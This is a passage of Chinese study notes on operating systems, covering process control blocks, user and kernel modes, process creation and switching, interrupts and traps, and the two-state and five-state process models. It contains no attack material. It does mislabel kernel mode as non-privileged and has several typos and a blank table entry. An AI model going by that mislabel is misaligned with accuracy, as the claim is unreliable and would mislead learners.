状态信息∶包括<u>中断允许/禁用标志、执行模式</u></td></tr><tr><td>栈指针</td><td>每个进程有一个或多个与之相关联的后进先出（LIFO）系统栈。栈用于保存参数和过程调用或系统调用的地址，栈指针指向栈顶</td></tr></tbody></table><ul><li>进程<strong>控制</strong>信息</li></ul><table><thead><tr><th></th><th>进程控制信息</th></tr></thead><tbody><tr><td>调度和状态信息</td><td>是操作系统执行<strong>调度功能</strong>所需的信息，典型的信息项包括∶ <br />●进程状态∶定义待调度执行的进程的准备情况（如运行态、就绪态、等待态、停止态）<br />●优先级∶描述讲程调度优先级的个或多个域。某些系统需要多个值（如默认、当前、最高许可） <br />● 调度相关信息;具体取决于所用的调度算法，如进程等待的时间总量和进程上次运行的执行时间总量 <br />● 事件∶进程在继续执行前等待的事件标识</td></tr><tr><td>数据结构</td><td>程可以以队列、环或其他结构链接到其他进程。例如，具有某一特定优先级且处于等待状态的所有进程可在一个队列中链接。一个进程与另一个进程间的关系可是父子（创建者-被创建者）关系。进程控制 块中或包含至其他进程的指针，以支持这些结构</td></tr><tr><td>进程间通信</td><td>各种标记、信号和信息可与两个无关进程间的通信关联。进程控制块中可维护某些或全部此类信息</td></tr><tr><td>进程特权</td><td>进程根据其可以访问的内存和可执行的指令类型来赋予特权。此外，特权也适用于系统实用程序和服务的使用</td></tr><tr><td>存储管理</td><td>该部分包括指向描述分配给该进程的虚存的段表和/或页表的指针</td></tr><tr><td>资源所有权和使用情况</td><td>示进程控制的资源，如一个打开的文件。还可包含处理器或其他资源的使用历史，调度器需要这些信息</td></tr></tbody></table></li><li><p>进程标识信息</p><ul><li>每个进程都分配了一个唯一的数字标识符，<strong>进程标识符（<em>process identification</em>）</strong>，可以简单地表示为主进程表中的一个索引</li><li>进程相互进行<strong>通信</strong>时，<strong>进程标识符</strong>可用于通知操作系统某一<strong>特定通信的目标</strong></li><li>允许进程创建其他进程时，<strong>标识符</strong>可用于指明每个进程的<strong>父进程和后代进程</strong></li><li>进程标识符外，还给进程分配了一个<strong>用户标识符</strong>，用于说明拥有该进程的用户</li></ul></li><li><p>处理器状态信息（<em>processor state information</em>）</p><ul><li>由处理器<strong>寄存器</strong>的内容组成</li><li>中断进程时，必须保存该寄存器的所有信息，以便进程恢复执行时可以恢复所有这些信息</li><li>（典型）寄存器组=用户可见寄存器+控制和状态寄存器+栈指针</li><li><strong>所有</strong>处理器设计都包括一个或一组称为<strong>程序状态字（<em>Program Statusord，PSW</em>）<strong>的寄存器，它包含有</strong>状态信息</strong></li></ul></li><li><p>进程控制信息（<em>process control information</em>）</p><ul><li>操作系统<strong>控制和协调</strong>各种活动进程所需的<strong>额外信息</strong></li></ul></li></ul></li><li><p>进程映像=进程控制块（进程ID+处理器状态信息+进程控制信息）+用户栈+进程专用地址空间+共享地址空间，进程映像的地址范围是否连续取决于<strong>内存管理方案</strong>和<strong>操作系统组织控制结构的方式</strong></p></li><li><p>进程控制块的作用</p><ul><li>进程控制块是操作系统中最重要的数据结构</li><li>每个进程控制块都包含操作系统所需进程的<strong>所有信息</strong></li><li>可以说资源控制块集合定义了操作系统的状态。</li></ul></li></ul><h1>3.4进程控制</h1><h3 id="3-4-1执行模式">3.4.1执行模式</h3><ul><li>用户模式（<em>user mode</em>）<ul><li>非特权模式</li><li>用户程序通常在该模式下运行</li></ul></li><li>系统模式（<em>system mode</em>）[控制模式（<em>control mode</em>）或内核模式（<em>kernel mode</em>）]<ul><li>非特权模式</li><li>操作系统的内核，它是操作系统中包含重要系统功能的部分</li><li>在内核模式下，软件会<u>完全控制</u><strong>处理器及其所有指令、寄存器和内存</strong></li></ul></li><li>处理器如何知道它正在什么模式下执行：<strong>程序状态字</strong>中通常存在一个指示执行模式的位，该位会因事件的改变而变化</li><li>当用户调用一个<strong>操作系统服务或中断</strong>来触发系统例程的执行时，执行模式将被置为内核模式</li><li>而当从系统服务返回到用户进程时，执行模式则置为用户模式</li></ul><h3 id="3-4-2进程创建">3.4.2进程创建</h3><p>操作系统创建进程的步骤</p><p>:one:为新进程分配一个<strong>唯一的进程标识符</strong></p><ul><li>此时，主进程表中会添加一个<strong>新表项</strong>，每个进程一个表项</li></ul><p>:two:进程分配空间</p><ul><li>包括<strong>进程映像</strong>中的<strong>所有元素</strong></li><li>操作系统必须知道<strong>私有用户地址空间（程序和数据）<strong>和</strong>用户栈</strong>需要多少空间。默认情况下会根据进程的类型分配这些值，但也可在作业创建时基于用户请求设置这些值</li><li>若一个进程由另一个进程生成，则<strong>父进程</strong>可把所需的值作为<strong>进程创建请求</strong>的一部分传递给操作系统</li><li>若任何已有的地址空间将被这个新进程共享，则要建立正确的链接</li><li>必须为<strong>进程控制块</strong>分配空间</li></ul><p>:three:初始化进程控制块</p><ul><li>进程标识部分包括进程ID和其他相关的 ID</li><li><strong>处理器状态信息</strong>部分的多数项目通常初始化为0，但**程序计数器（置为程序入口点）<strong>和</strong>系统栈指针（定义进程栈边界）**除外</li><li><strong>进程状态</strong>通常初始化为<strong>就绪</strong>或<strong>就绪/挂起</strong></li><li><strong>优先级</strong>默认情况下可设置为<strong>最低</strong></li><li>进程最初不拥有任何资源（I/O 设备、文件），除非<strong>显式地请求</strong>了这些资源，或<strong>继承</strong>了父进程的资源</li></ul><p>:four:设置正确的链接</p><ul><li>若操作系统将每个调度队列都维护为一个链表，则新进程必须放在<strong>就绪</strong>或<strong>就绪/挂起</strong>链表中</li></ul><p>:five:创建或扩充其他数据结构</p><ul><li>如：操作系统可因编制账单和/或评估性能，为每个进程维护一个记账文件</li></ul><h3 id="3-4-3进程切换（process-switch）">3.4.3进程切换（<em>process switch</em>）</h3><h6 id="何时切换">何时切换</h6><ul><li><p>进程切换可在操作系统从当前正运行进程中获得控制权的任何时刻发生</p></li><li><p>两种系统中断：</p><ul><li>中断（interrupt）：与当前正运行进程无关的某种外部事件相关，如完成一次 I/O 操作</li><li>陷阱（trap）：与当前正运行进程产生的<strong>错误或异常条件</strong>相关，如非法的文件访问</li><li>进程执行的中断机制</li></ul><table><thead><tr><th>机制</th><th>原因</th><th>用途</th></tr></thead><tbody><tr><td>中断</td><td>来自当前执行指令的<strong>外部</strong></td><td>对<strong>异步外部事件</strong>的反应</td></tr><tr><td>陷阱</td><td>与当前执行指令相关</td><td>处理一个错误或一个异常条件</td></tr><tr><td>系统调用</td><td>显式请求</td><td>调用操作系统函数</td></tr></tbody></table></li><li><p>普通中断</p></li><li><p>示例</p><ul><li>时钟中断<ul><li>操作系统确定当前正运行进程的执行时间是否已超过最大允许时间段[时间片（time slice），即进程中断前可以执行的最大时间段]。若超过，进程就切换到就绪态，并调入另一个进程</li></ul></li><li>I/O中断<ul><li>若 I/O活动是一个或多个进程正在等待的事件，则操作系统就把所有处于<strong>阻塞态</strong>的进程转换为<strong>就绪态</strong>（<strong>阻塞/挂起态</strong>进程转换为<strong>就绪/挂起态</strong>）</li><li>操作系统必须决定是继续执行当前处于运行态的进程，还是让具有<strong>高优先级的就绪态</strong>进程<strong>抢占</strong>这个进程</li></ul></li><li>内存失效<ul><li>处理器遇到一个引用不在内存中的字的虚存地址时，操作系统就必须从外存中把包含这一引用的内存块（页或段）调入内存</li><li>发出调入内存块的I/O请求后，内存失效进程将进入<strong>阻塞态</strong>。作系统然后<strong>切换进程</strong>，恢复另一个进程的执行。期望的块调入内存后，该进程置为<strong>就绪态</strong></li></ul></li></ul></li><li><p>对于陷阱</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/184628.jpg" class=""></li><li><p>操作系统可被来自正执行程序的**系统调用（<em>supervisor call</em>）**激活</p><ul><li>例如，正运行用户进程执行了一个请求 I/O操作的指令（如打开文件），这时该调用会转移到作为操作系统代码一部分的一个例程</li><li>使用<strong>系统调用</strong>时会将用户进程置为<strong>阻塞态</strong></li></ul></li></ul><h6 id="切换模式">切换模式</h6><ul><li><p>无中断出现时，处理器会继续<strong>取指阶段</strong>，并在当前进程中取当前程序的下一条指令</p><p>出现中断时，处理器：</p><ul><li>将<strong>程序计数器</strong>置为<strong>中断处理程序</strong>的<strong>开始地址</strong></li><li><strong>从用户模式</strong>切换到<strong>内核模式</strong>，以便<strong>中断处理代码</strong>包含<strong>特权指令</strong></li><li>继续取指阶段，并取中断处理程序的第一条指今来服务该中断</li><li>此时，将已中断进程的<strong>上下文</strong>保存到已中断程序的<strong>进程控制块</strong>中<ul><li>上下文：必须包含中断处理程序<strong>可能改变的所有信息</strong>，以及<strong>恢复</strong>被中断程序时所需要的<strong>所有信息</strong>。因此，必须保存称为<u>处理器状态信息</u>的<u>进程控制块部分</u>，包括程序计数器、其他处理器寄存器、栈信息</li></ul></li></ul></li><li><p>中断处理程序通常是执行一些与中断相关的基本任务的小程序</p><ul><li>会<strong>重置</strong>表示<u>中断出现</u>的<strong>标志或指示器</strong>，为发出中断的实体如 I/O模块<strong>发送应答</strong>，做一些与中断事件的影响相关的<strong>辅助工作</strong></li><li>若中断与 I/O 事件有关，则中断处理程序<strong>检查错误条件</strong></li><li>发生了错误，则中断处理程序给<strong>最初</strong>请求 I/O操作的进程发一个信号</li><li>若是时钟中断，则处理程序把<strong>控制权</strong>移交给分派器，由分派器将控制权传递给另一个进程，因为给当前运行进程分配的时间片已用尽</li></ul></li></ul><h6 id="进程状态的变化">进程状态的变化</h6><ul><li>模式切换<ul><li>模式切换可在<strong>不改变运行态进程</strong>的状态的情况下出现。此时<strong>保存上下文</strong>并在以后<strong>恢复上下文</strong>仅需很少的开销</li></ul></li><li>进程切换<ul><li>当前正运行进程将转换为另一状态（就绪、阻塞等），则操作系统必须使环境产生<strong>实质性</strong>的变化</li><li>完整的进程切换步骤<ul><li><strong>保存</strong>处理器的上下文，包括程序计数器和其他寄存器</li><li><strong>更新</strong>当前处于<strong>运行态</strong>进程的<strong>进程控制块</strong>，包括把进程的状态改变为另一状态（就绪态、阻塞态、就绪/挂起态或退出态）。还须更新其他<strong>相关的字段</strong>，包括退出运行态的<strong>原因</strong>和<strong>记账信息</strong></li><li>把该进程的进程控制块移到<strong>相应的队列</strong>（就绪、在事件i处阻塞、就绪/挂起）</li><li><strong>选择</strong>另一个进程执行</li><li><strong>更新所选</strong>进程的进程控制块，包括把进程的状态改为运行态</li><li>更新内存管理数据结构。是否需要更新取决于<strong>管理地址转换</strong>的方式</li><li>载入<strong>程序计数器</strong>和其他<strong>寄存器</strong>先前的值，将处理器的上下文<strong>恢复</strong>为所选进程上次退出运行态时的上下文</li></ul></li></ul></li></ul><h1>3.5操作系统的执行</h1><h3 id="3-5-1无进程内核">3.5.1无进程内核</h3><ul><li><p>在许多老操作系统中，传统且通用的一种方法是在所有进程外部执行操作系统内核</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/os3.15a.jpg" class=""></li><li><p>若当前正运行进程被中断或产生一个系统调用，则会保存该进程的模式上下文，并将控制权转交给内核</p></li><li><p>操作系统本身具有<strong>控制过程调用和返回</strong>的内存区域与系统栈</p></li><li><p><strong>进程</strong>这一概念仅适用于<strong>用户程序</strong>，而<strong>操作系统代码</strong>则是在<strong>特权模式</strong>下<strong>单独运行的实体</strong></p></li></ul><h3 id="3-5-2在用户进程内运行">3.5.2在用户进程内运行</h3><ul><li><p><strong>较小计算机</strong>（PC、工作站）的操作系统通常采用另一种方法，即在<strong>用户进程的上下文</strong>中执行<strong>所有操作系统软件</strong>。此时操作系统是<strong>用户调用</strong>的一组<strong>例程</strong></p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/os3.15b.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/os3.16.jpg" class=""></li><li><p>任何时刻操作系统都管理着n个<strong>进程映像</strong></p></li><li><p>当进程在<strong>内核模式</strong>下运行时，<strong>单独的内核栈</strong>用于管理<strong>调用/返回</strong></p></li><li><p>操作系统<strong>代码和数据</strong>位于<strong>共享地址空间</strong>中，<u>并被所有用户进程共享</u></p></li><li><p>发生中断、陷阱或系统调用时，<strong>处理器</strong>置于内核模式，<strong>控制权</strong>转交给<strong>操作系统</strong></p></li><li><p>要把<strong>控制权</strong>从<strong>用户程序</strong>转交给<strong>操作系统</strong>，需要<strong>保存模式上下文</strong>并<strong>切换模式</strong>，再切换到一个<strong>操作系统例程</strong>，但此时仍然是在当前的<strong>用户进程</strong>内继续执行，不需要切换进程，只是在同一进程中切换模式</p></li></ul><h3 id="3-5-3基于进程的操作系统">3.5.3基于进程的操作系统</h3><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/os3.15c.jpg" class=""><ul><li>是把操作系统作为<strong>一组系统进程</strong>来实现</li><li>类似于其他方法，该<strong>软件</strong>是在内核对模式下运行的<strong>内核的一部分</strong>。但在这种情况下，主要的内核功能被组织为独立的进程。同样，此时存在一些在任何进程之外执行的进行切换代码</li><li>优点：<ul><li>它利用了鼓励使用<strong>模块化</strong>操作系统的程序设计原理，可使模块间的<strong>接口最小且最简单</strong></li><li>有些<strong>非关键</strong>操作系统功能可<strong>简单</strong>地用<strong>独立的进程</strong>来实现<ul><li>如监视各种资源（处理器、内存、通道）利用率和系统中用户进程进展状态的程序</li><li>这种程序不向任何活动进程提供特殊的服务，因此只能被操作系统调用</li><li>作为一个进程，这一功能可以任何指定的优先级在分派器的控制下与其他进程<strong>交替执行</strong></li></ul></li><li>把操作系统作为一组进程来实现时，在<strong>多处理器</strong>或<strong>多机环境</strong>中很有用，因此此时为<strong>提高性能</strong>，有些操作系统服务可传送到专用的处理上执行</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-进程描述和控制（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>操作系统须满足的多数需求都涉及进程：</p><ul><li>操作系统与普通计算机软件的作用相同，即它是由处理器执行的一段程序或一组程序</li><li>操作系统必须交替执行多个程序，在合理的响应时间范围内使处理器的利用率最大</li><li>操作系统必须按照特定的策略(如某些函数或应用进程具有较高的优先级)给进程分配资源，同时避免死锁</li><li>操作系统须为有助于构建应用的进程间通信和用户船舰提供支持</li></ul><h1>3.1什么是进程</h1><h3 id="3-1-1背景">3.1.1背景</h3><h3 id="3-1-2进程和进程控制块">3.1.2进程和进程控制块</h3><ul><li><p>进程的几个定义</p><ul><li>一个正在执行的程序</li><li>一个正在执行的程序</li><li>能分配给处理器并由处理器执行的实体</li><li>由一组执行的指令、一个当前状态和一组相关的系统资源表征的活动单元</li></ul></li><li><p>进程的基本元素：</p><ul><li><strong>程序代码（<em>program code</em>）</strong>：可能被执行相同程序的其他进程共享</li><li>与代码相关联的<strong>数据集（<em>set of data</em>）</strong></li></ul></li><li><p>任一时刻进程的表征：</p><ul><li>标识符：唯一，用于区别其他进程</li><li>状态</li><li>优先级：相对于其他进程的优先顺序</li><li>程序计数器：程序中执行<strong>下一条指令</strong>的<strong>地址</strong></li><li>内存指针：包括<strong>程序代码</strong>和<strong>进程相关数据</strong>的指针，以及与其他进程<strong>共享内存块</strong>的指针</li><li>I/O状态：显式I/O请求、分配给进程的I/O设备（如磁带驱动器）、被进程使用的文件列表等</li><li>记账信息：处理器时间总和、使用的时间数总和、时间限制、记账号等</li></ul></li><li><p>上述表征信息存放在一个称为<strong>进程控制块（<em>process control block</em>）<strong>的数据结构中，控制块由</strong>操作系统</strong>创建和管理</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.1.jpg" class=""><ul><li><p>进程控制块包含了<strong>充分的信息</strong>，因此可以<strong>中断</strong>一个进程的执行，并<strong>恢复</strong></p></li><li><p>进程控制块是操作系统为<strong>支持多进程</strong>并提供<strong>多重处理技术</strong>的关键工具</p></li><li><p>进程<strong>中断</strong>时，<strong>操作系统</strong>会把<strong>程序计数器</strong>和<strong>处理器寄存器（上下文信息）<strong>保存到</strong>进程控制块</strong>中的相应位置，<strong>进程状态</strong>相应地改为其他值，如阻塞态或就绪态</p></li><li><p><strong>现代操作系统</strong>可以随意将其他进程<strong>置为运行态</strong>，并把它的<strong>程序计数器</strong>和<strong>进程上下文</strong>加载到<strong>处理器寄存器</strong>中，进而<strong>执行</strong>这一<strong>进程</strong></p><p>（操作系统会为待执行程序创建进程或任务）</p></li><li><p>可以说<u>进程=程序代码+相关数据+进程控制块</u></p></li></ul></li></ul><h1>3.2进程状态</h1><ul><li><p>处理器以某种顺序执行指令序列中的指令，这种顺序由程序计数器寄存器中不断变化的值给出，因为程序计数器可能会执行不同进程的不同代码部分</p></li><li><p>列出为进程执行的指令序列，可描述单个进程的行为，这样的序列称为进程<strong>轨迹（<em>trace</em>）</strong>。给出各个进程轨迹的<strong>交替</strong>方式，就可描述处理器的行为</p></li><li><p>分派器（调度器）：在内存中，使处理器<strong>切换进程</strong></p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.2.jpg" class=""></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.3.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.4.jpg" class=""><h3 id="3-2-1两状态进程模型">3.2.1两状态进程模型</h3><ul><li>操作系统的基本职责：控制进程的执行，包括确定<strong>交替执行的方式</strong>和<strong>给进程分配资源</strong><ul><li><p>操作系统创建一个<strong>新进程</strong>时，将该进程以<strong>未运行态</strong>加入系统，操作系统知道这个进程的存在，并正在<strong>等待执行机会</strong></p></li><li><p>正在运行的进程被中断时，操作系统中的<strong>分派器</strong>部分将<strong>选择</strong>一个新进程运行</p></li><li><p>进程控制块用于方便操作系统跟踪进程</p></li><li><p>被中断的进程转移到等待进程队列中，或在进程结束或取消时销毁</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.5.jpg" class=""></li></ul></li></ul><h3 id="3-2-2进程的创建和终止">3.2.2进程的创建和终止</h3><h5 id="进程的创建">进程的创建</h5><ul><li>操作系统：<strong>建立</strong>用于<strong>管理</strong>新进程的<strong>数据结构</strong>，在内存中<strong>分配地址空间</strong></li><li>操作系统负责新进程的创建<ul><li>批处理环境中：响应作业提交时会创建进程</li><li>交互环境中：新用户实体登录时会创建进程</li><li>可能会代表应用程序创建进程：如用户请求打印一个文件，则操作系统可以创建一个管理打印的进程，进而使请求进程可以继续执行，与打印任务的时间无关</li></ul></li><li>触发进程创建的时间（进程创建的原因）</li></ul><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td>新的批处理作业</td><td><strong>磁带或磁盘</strong>中的<strong>批处理</strong>作业<strong>控制流</strong>通常会提供给操作系统，当操作系统准备接收新工作时，将读取下一个作业控制命令</td></tr><tr><td>交互登录</td><td>终端用户登录到系统</td></tr><tr><td>为<strong>提供服务</strong>而由操作系统创建</td><td>操作系统可以创建一个进程，<u>代表用户程序执行一个功能</u>，使用户无需等待（如控制打印的进程）</td></tr><tr><td>由现有进程派生</td><td>基于<strong>模块化</strong>的考虑或<strong>开发并行性</strong>，用户程序可以创建多个进程</td></tr></tbody></table><ul><li>（传统上和现代常见）操作系统会以对用户或应用程序透明的方式来创建所有进程</li><li>当操作系统为另一个进程的显式请求创建一个进程时，这个动作就成为<strong>进程派生（<em>process spawning</em>）</strong></li><li>当一个进程派生另一个进程时，前一个进程称为<strong>父进程（<em>parent process</em>）</strong>，被派生的进程称为<strong>子进程（<em>child process</em>）</strong></li></ul><h5 id="进程终止">进程终止</h5><ul><li>批处理作业中应包含一个Halt指令或其他操作系统显式服务调用来终止</li><li>常见的导致进程终止的原因</li></ul><table><thead><tr><th>事件</th><th>说明</th></tr></thead><tbody><tr><td>正常完成</td><td>进程自执行一个<strong>操作系统服务调用</strong>，表明已经结束运行</td></tr><tr><td>超过时限</td><td>可以测量多种类型的使劲按，包括总运行时间（挂钟时间）、花费在执行上的时间、对于交互进程从上一次用户输入到当前时刻的时间总量</td></tr><tr><td>无可用内存</td><td>系统无法满足进程需要的内存空间</td></tr><tr><td>超出范围</td><td>进程试图访问<strong>不允许访问</strong>的<strong>内存单元</strong></td></tr><tr><td>保护错误</td><td>进程试图使用<strong>不允许使用</strong>的资源或文件，或试图以一种<strong>不正确的方式</strong>使用（如往只读中写）</td></tr><tr><td>算术错误</td><td>进程试图进行被禁止的计算，如<strong>除以0</strong>或<strong>存储</strong>大于硬件可以接纳的数字</td></tr><tr><td>时间超出</td><td></td></tr><tr><td>I/O失败</td><td>在输入或输出期间发生错误。如找不到文件、在超过规定的最多努力次数后仍然读/写失败（如遇到磁带上的一个坏区时）、无效操作（如从打印机中读）</td></tr><tr><td>无效指令</td><td>进程试图执行一个不存在的指令（通常是由于转移到了数据区并<strong>企图执行数据</strong>）</td></tr><tr><td>特权指令</td><td>进程试图使用<strong>为操作系统保留的指令</strong></td></tr><tr><td>数据误用</td><td><strong>错误类型</strong>或<strong>未初始化</strong>的一块数据</td></tr><tr><td>操作员或操作系统干涉</td><td>由于某些原因，操作员或操作系统终止进程（如出现死锁时)</td></tr><tr><td>父进程终止</td><td>当一个父进程终止时，操作系统可能会自动终止该进程的所有子进程</td></tr><tr><td>父进程请求</td><td>父进程通常具有终止其任何子进程的权力</td></tr></tbody></table><ul><li>注：在某些情况下，宽松的操作系统可能会允许用户从错误中恢复而不结束进程。例如如果用户请求访问文件失败，操作系统可能仅仅告知访问被拒绝并且允许进程继续执行</li></ul><h3 id="3-2-3五状态模型">3.2.3五状态模型</h3><ul><li><p>对于可运行的进程：<strong>处理器</strong>以一种**轮转（<em>round-robin</em>）**方式操作（依次给队列中每个进程一定的执行时间，然后进程返回队列。阻塞情况除外）</p></li><li><p>问题：存在一些处于<strong>非运行态</strong>但已<strong>就绪等待执行</strong>的进程、处于<strong>阻塞态</strong>等待<strong>I/O操作结束</strong>的进程</p></li><li><p>解决：</p><ul><li>分派器不能只考虑队列中最老的进程，而应扫描整个列表，查找那些<strong>未被阻塞</strong>且在队列中<strong>时间最长</strong>的进程</li><li>分态：<ul><li>运行态</li><li>就绪态：进程做好了准备，只要有机会就开始执行</li><li>阻塞/等待态：进程在某些时间发生前不能执行，如I/O操作完成</li><li>新建态：刚刚创建的进程，操作系统还未把它加入<strong>可执行进程组</strong>，它通常是<strong>进程控制块</strong>已经创建但还<strong>未加载</strong>到<strong>内存</strong>中的新进程</li><li>退出态：操作系统从可执行进程组中释放出的进程。自身已停止or因某种原因被取消</li></ul></li></ul></li><li><p>操作系统创建新进程：</p><ul><li>操作系统执行一些必需的<strong>辅助工作</strong>，将<strong>标识符</strong>关联到<strong>进程</strong>，并<strong>分配</strong>和<strong>创建</strong>管理进程所需要的<strong>全部表格</strong><ul><li>此时进程处于<strong>新建态</strong>，操作系统已经执行了创建进程的必须动作，但还<strong>未执行程序</strong></li><li>如操作系统可能会因为<strong>性能不高</strong>或<strong>内存不足</strong>而<strong>限制</strong>系统中的进程数量</li></ul></li><li>进程处于新建态时，操作系统所需的<strong>关于该进程的信息</strong>保存在<strong>内存</strong>中的<strong>进程表</strong>内，但进程本身还未进入内存<ul><li>即将执行的程序代码不在内存中，也没有未与这个程序相关的数据<strong>分配空间</strong></li><li>进程处于新建态时，程序保留在<strong>外存</strong>中，通常保留在磁盘中</li></ul></li></ul></li><li><p>进程退出系统：</p><ul><li>进程到达一个自然结束点、由于不可恢复的错误而取消、在具有相应权限的另一个进程取消该进程时，进程将<strong>终止</strong></li><li>终止将使进程转换为<strong>退出态</strong>，此时不在执行进程，与作业相关的表或<strong>其他信息</strong>会<strong>临时</strong>被<strong>操作系统</strong>保留，因此给<strong>辅助程序或支持程序</strong>提供了<strong>提取所需信息</strong>的时间</li><li><strong>实用程序</strong>为了<strong>分析性能和利用率</strong>，可能需要提取进程的历史信息，提取后，操作系统就不在需要保留任何与该进程相关的数据，因此会从系统中<strong>删除</strong>该进程</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/080139.jpg" class=""></li><li><p>可能的状态转换</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.6.jpg" class=""><ul><li><p>空（Null）==&gt;新建（New）：上表事件可能会发生</p></li><li><p>新建==&gt;就绪（Ready）态：</p><ul><li>操作系统准备好再接纳一个进程时，<u>把</u>一个进程从新建态转换成就绪态</li><li><u>大多数</u>操作系统会基于<strong>现有的进程数</strong>或<strong>分配给现有进程的虚存数量</strong>设置一些<strong>限制</strong>，以确保不会因为活跃进程的数量过多而导致系统性能下降</li></ul></li><li><p>就绪==&gt;运行（Running）态：</p><ul><li>操作系统选择一个处于就绪态的进程（调度器或分派器的工作）</li></ul></li><li><p>运行==&gt;退出（Exit）：被操作系统终止</p></li><li><p>运行==&gt;就绪：</p><ul><li>最常见原因：正在运行的进程已经达到“允许不中断执行”的最大时间段，the  running process has reached the maximum allowable time for uninterrupted  execution</li><li>很多多道操作系统都实行了这类时间限制</li><li>其他原因，如操作系统给不同的进程分配不同的优先级（并未在所有的操作系统中实现）</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/181927.jpg" class=""><ul><li>A被<strong>抢占（<em>preempted</em>）</strong>，一般来说，抢占定义为回收一个进程正在使用的资源。此时资源就是处理器本身，进程正在执行并且可以继续执行，但由于其他进程需要执行而被抢占</li><li>其他原因，如：进程<strong>自愿释放对处理器的控制</strong>（例如一个周期性进行<strong>记账</strong>和<strong>维护</strong>的<strong>后台进程</strong>）</li></ul></li><li><p>运行==&gt;阻塞（blocked）态：</p><ul><li>进程请求其必须等待的某些事件时，进入阻塞态</li><li>对<strong>操作系统</strong>的请求通常以<strong>系统服务调用</strong>的形式发出，即运行的程序请求调用操作系统中一部分代码所发生的过程<ul><li>进程可能请求操作系统的一个服务，但操作系统无法<strong>立即</strong>予以服务</li><li>请求一个<strong>无法得到的资源</strong>，如文件或虚存中的共享区域</li><li>需要进行某种<strong>初始化</strong>的工作，如I/O操作所遇到的情况，并且只有在该初始化工作完成后才能继续执行</li></ul></li><li>当进程相互通信，一个进程等待另一个进程提供输入时，或等待来自另一个进程的信息时，可能会被阻塞</li></ul></li><li><p>阻塞==&gt;就绪：所等待的事件发生</p></li><li><p>就绪==&gt;退出：在某些系统中，父进程可在任何时刻终止一个子进程。如果父进程终止，那么与该父进程相关的所有子进程都将被终止</p></li><li><p>阻塞==&gt;退出（同上）</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8A%EF%BC%89/os3.7.jpg" 